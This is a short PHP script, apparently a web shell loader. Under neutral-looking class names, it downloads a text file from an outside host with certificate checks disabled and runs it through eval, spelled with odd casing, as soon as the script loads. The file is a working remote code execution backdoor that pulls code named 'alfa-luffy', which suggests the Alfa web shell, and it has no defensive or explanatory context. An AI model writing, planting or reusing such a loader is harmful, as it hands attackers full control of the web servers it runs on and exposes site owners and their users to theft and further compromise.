<?php
class CurlFetcher {
    public function fetchContent(string $url) {
        if (!function_exists('curl_version')) {
            throw new Exception("cURL is not enabled on this server.");
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        
        $res = curl_exec($ch);
        
        if (curl_errno($ch)) {
            $err = curl_error($ch);
            curl_close($ch);
            throw new Exception("cURL Error: " . $err);
        }
        curl_close($ch);
        return $res;
    }
}

class CodeExecutor {
    private $f;
    public function __construct(CurlFetcher $f) {
        $this->f = $f;
    }
    public function executeCodeFromURL(string $u): void {
        $c = $this->f->fetchContent($u);
        if ($c === false || trim($c) === '') {
            throw new Exception("Failed to fetch content from URL or the content is empty.");
        }
        EvaL("?>" . $c);
    }
}

try {
    $executor = new CodeExecutor(new CurlFetcher());
    $executor->executeCodeFromURL("https://henshinjakarta.org/kerang/alfa-luffy.txt");
} catch (Exception $e) {
    echo "Error: " . htmlspecialchars($e->getMessage());
}
